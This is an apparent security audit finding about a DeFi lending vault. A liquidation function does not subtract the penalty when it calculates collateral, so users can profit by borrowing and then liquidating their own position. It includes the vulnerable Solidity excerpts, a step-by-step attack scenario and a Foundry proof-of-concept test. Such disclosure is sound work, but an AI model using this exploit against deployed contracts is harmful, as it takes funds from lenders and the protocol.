## [H] Liquidation doesn't account for penalty when calculating collateral to give, allowing users to profit by borrowing and self-liquidating

`CDPVault` allows users to borrow `underlying` from `PoolV3` by depositing collateral into the vault, such that the `(collateral value of their position / liquidationRatio) >= their current total debt`.

Users must repay their debt fully via `CDPVault::repay`, and the amount must cover their entire `current total debt`, which also includes various interest factors. If the value of their collateral divided by `liquidationRatio` is less than the debt of their position, then their position is considered `unsafe` and anyone can `liquidate` the position by buying the collateral at a `discount`. The amount spent by the caller is used to cover for the debt.

To ensure that users cannot profit from self liquidations, the `liquidatePosition` function incorporates a penalty mechanism, that is intended to deduct fees from the payment amount, which subsequently goes to the protocol as profit.

The problem is that when the `liquidatePosition` function calculates the collateral to give to the caller, it utilizes the the repay amount *without* the penalty, essentially functioning as if there is no penalty mechanism at all. The caller can specify any `repay amount`, and the collateral they receive will correspond directly to `repay amount / discount`, with no penalty.

This allows malicious users to profit by `deposit collateral -> borrow WETH -> have their position become unsafe -> buy collateral with WETH at a discount`. Malicious users can profit and steal funds from lenders and the protocol.

> The natspec for the `CDPVault::liquidatePosition` states that "From that repay amount a penalty (`liquidationPenalty`) is subtracted to mitigate against profitable self liquidations." 

However, we will see in the PoC how this has no impact against profitable self liquidations

### Proof of Concept

The following block is executed when users repay their debt:

[CDPVault.sol#L402-L426](relative_path_091409:src/CDPVault.sol#L402-L426)

```javascript
    } else if (deltaDebt < 0) {
@>      uint256 maxRepayment = calcTotalDebt(debtData);
        uint256 amount = abs(deltaDebt);
        if (amount >= maxRepayment) {
            amount = maxRepayment; // U:[CM-11]
            deltaDebt = -toInt256(maxRepayment);
        }

        poolUnderlying.safeTransferFrom(creditor, address(pool), amount);

        uint128 newCumulativeQuotaInterest;
        if (amount == maxRepayment) {
            newDebt = 0;
            newCumulativeIndex = debtData.cumulativeIndexNow;
            profit = debtData.accruedInterest;
            newCumulativeQuotaInterest = 0;
        } else {
            (newDebt, newCumulativeIndex, profit, newCumulativeQuotaInterest) = calcDecrease(
                amount, // delta debt
                position.debt,
                debtData.cumulativeIndexNow, // current cumulative base interest index in Ray
                position.cumulativeIndexLastUpdate,
                debtData.cumulativeQuotaInterest
            );
        }
```

For users to completely repay their loan, they must pay `maxRepayment` amount, which is calculated via a call to `calcTotalDebt`.

If the position is unsafe (`collateral value / liquidation ratio < total debt`), then anyone can liquidate it for a discount:

[CDPVault.sol#L521-L532](relative_path_091409:src/CDPVault.sol#L521-L532)

```javascript
        // load price and calculate discounted price
        uint256 spotPrice_ = spotPrice();
@>      uint256 discountedPrice = wmul(spotPrice_, liqConfig_.liquidationDiscount);
        if (spotPrice_ == 0) revert CDPVault__liquidatePosition_invalidSpotPrice();
        // Ensure that there's no bad debt
        if (calcTotalDebt(debtData) > wmul(position.collateral, spotPrice_)) revert CDPVault__BadDebt();

        // compute collateral to take, debt to repay and penalty to pay
@>      uint256 takeCollateral = wdiv(repayAmount, discountedPrice);
        uint256 deltaDebt = wmul(repayAmount, liqConfig_.liquidationPenalty);
        uint256 penalty = wmul(repayAmount, WAD - liqConfig_.liquidationPenalty);
```

There is also a penalty that the liquidator must pay (deducted from `repayAmount`). This is to mitigate profits from self-liquidation, as stated by the natspec of this function:

[CDPVault.sol#L503-L504](relative_path_091409:src/CDPVault.sol#L503-L504)

```javascript
    /// ... From that repay amount a penalty (`liquidationPenalty`) is subtracted to mitigate against
    /// profitable self liquidations ...
```

So the actual amount of debt repaid by the liquidator is `repayAmount - penalty`:

[CDPVault.sol#L538-L539](relative_path_091409:src/CDPVault.sol#L538-L539)

```javascript
    // transfer the repay amount from the liquidator to the vault
    poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount - penalty);
```

In the same call, the `penalty` is also transferred to the pool, taken as a profit for the protocol.

[CDPVault.sol#L567-L569](relative_path_091409:src/CDPVault.sol#L567-L569)

```javascript
     // Mint the penalty from the vault to the treasury
        poolUnderlying.safeTransferFrom(msg.sender, address(pool), penalty);
        IPoolV3Loop(address(pool)).mintProfit(penalty);
```

However, there is a critical problem here. We can see that the intention here is that the caller pays `repayAmount - penalty` for the debt, and that the penalty goes towards profit.

This can be confirmed by observing the amount of debt that is covered via repayment:

[CDPVault.sol#L530](relative_path_091409:src/CDPVault.sol#L530)

```javascript
     uint256 deltaDebt = wmul(repayAmount, liqConfig_.liquidationPenalty);
```

Note that `repayAmount * liqConfig_.liquidationPenalty` is equivalent to `repayAmount - penalty`. So the debt reduced is `repayAmount - penalty`. The problem is that the *collateral sent to the caller does not incorporate the penalty for liquidation*.

Essentially, this makes the `penalty` redundant, because the caller still receives the full `repayAmount` of collateral specified, including a `discount`.

A malicious user can perform the following attack scenario:

1. Deposit collateral via `CDPVault::deposit`.
2. Borrow WETH via `CDPVault::borrow`.
3. Have their position become unsafe (i.e., wait until enough debt interest is accrued such that `(collateral value of their position / liquidationRatio) < their current total debt`).
4. Fully buy back collateral at a discount.

### Coded PoC

Note: The value of the discount and penalty were chosen by observing the values currently set in `scripts/config.js`, they were not chosen arbitrarily.

Add the following to `test/unit/CDPVault.t.sol` and run `forge test --mt testSelfLiquidateProfit -vv`:

```javascript
    function testSelfLiquidateProfit() public {
        mockWETH.mint(address(this), 20e18);

        // discount = 0.98 ether (0.02% discount)
        // penalty = 0.99 ether (0.01% penalty)
        CDPVault vault = createCDPVault(token, 150 ether, 0, 1.25 ether, 0.99 ether, 0.98 ether);
        createGaugeAndSetGauge(address(vault));

        // create position
        uint256 wethBefore = mockWETH.balanceOf(address(this));
        _modifyCollateralAndDebt(vault, 100 ether, 80 ether);
        uint256 wethBorrowed = mockWETH.balanceOf(address(this)) - wethBefore;
        uint256 collateralDeposited = 100 ether;
        console.log("weth borrowed: ", wethBorrowed);
        console.log("collateral deposited: ", collateralDeposited);
        
        address position = address(this);
        uint256 amountUserMustRepay = vault.virtualDebt(position);
        console.log("Amount of debt user must repay: ", amountUserMustRepay);

        // any attempt to liquidate now will revert because position is safe
        vm.expectRevert(bytes4(keccak256("CDPVault__liquidatePosition_notUnsafe()")));
        vault.liquidatePosition(position, 1 ether);

        // user waits some time for price to change so position becomes unsafe (but no bad debt yet)
        // in reality, interest will accrue, however to make this PoC simple we will update spot price (which is another way user can take advantage)
        _updateSpot(0.80 ether);
        (uint256 collateral, uint256 debt , , , , ) = vault.positions(position);

        // calculate amount to repay to fully liquidate position.
        uint256 spotAmt = oracle.spot(address(token));
        uint256 discountPercent = 0.98 ether;
        uint256 discountAmount = wmul(spotAmt, discountPercent);
        uint256 repayFull = wmul(collateral, discountAmount);
        console.log("Amount user is repaying: ", repayFull);
        mockWETH.approve(address(vault), repayFull);

        // fully liquidate position
        wethBefore = mockWETH.balanceOf(address(this));
        uint collateralBefore = token.balanceOf(address(this));
        vault.liquidatePosition(position, repayFull);
        uint256 wethSpent = wethBefore - mockWETH.balanceOf(address(this));
        uint256 collateralReceived = token.balanceOf(address(this)) - collateralBefore;
        console.log("weth spent: ", wethSpent);
        console.log("collateral received: ", collateralReceived);
        
        console.log("Total WETH earned: ", wethBorrowed - wethSpent);
        console.log("collateral lost: ", collateralDeposited -  collateralReceived);

        // confirm that collateral in position is 0
        (collateral, debt, , , , ) = vault.positions(position);
        console.log("collateral remaining in position: ", collateral);
    }
```
